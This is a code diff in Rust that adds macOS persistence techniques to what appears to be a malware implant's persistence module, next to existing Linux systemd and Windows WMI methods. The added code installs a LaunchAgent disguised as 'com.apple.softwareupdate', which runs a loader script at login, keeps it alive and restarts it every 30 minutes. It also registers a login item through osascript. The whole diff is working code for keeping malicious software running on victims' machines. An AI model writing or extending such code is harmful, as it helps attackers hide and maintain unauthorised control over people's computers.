@@ -661,7 +661,77 @@ WantedBy=default.target
             });
         }
 
-        // 8. Windows WMI Event Subscription
+        // 8. macOS persistence via launchd
+        #[cfg(target_os = "macos")]
+        {
+            // LaunchAgent plist
+            let launch_agent_dir = PathBuf::from(&home).join("Library/LaunchAgents");
+            let plist_name = "com.apple.softwareupdate.plist";
+            let plist_path = launch_agent_dir.join(plist_name);
+
+            let launchd_result = (|| -> Result<String, String> {
+                std::fs::create_dir_all(&launch_agent_dir).map_err(|e| e.to_string())?;
+                let plist_content = format!(
+                    r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StartInterval</key>
+    <integer>1800</integer>
+</dict>
+</plist>"#,
+                    plist_name.trim_end_matches(".plist"), loader_script
+                );
+                std::fs::write(&plist_path, &plist_content).map_err(|e| e.to_string())?;
+                let _ = std::process::Command::new("launchctl")
+                    .args(["load", plist_path.to_str().unwrap_or("")])
+                    .output();
+                Ok(plist_path.to_string_lossy().to_string())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "macos_launchagent".into(),
+                path: launchd_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "launchd".into(),
+                installed: launchd_result.is_ok(),
+                description: format!("macOS LaunchAgent at {}", plist_path.display()),
+            });
+        }
+
+        // 9. macOS login items (via osascript)
+        #[cfg(target_os = "macos")]
+        {
+            let login_item_result = (|| -> Result<String, String> {
+                let script = format!(
+                    "tell application \"System Events\" to make login item at end with properties {{path:\"{}\", hidden:false}}",
+                    loader_script
+                );
+                let _ = std::process::Command::new("osascript")
+                    .args(["-e", &script])
+                    .output();
+                Ok("Login item added via osascript".into())
+            })();
+
+            results.push(PersistenceMechanism {
+                name: "macos_login_item".into(),
+                path: login_item_result.clone().unwrap_or_else(|e| e),
+                mechanism_type: "login_item".into(),
+                installed: login_item_result.is_ok(),
+                description: format!("macOS Login Item -> {}", loader_script),
+            });
+        }
+
+        // 10. Windows WMI Event Subscription
         #[cfg(target_os = "windows")]
         {
             let wmi_result = (|| -> Result<String, String> {
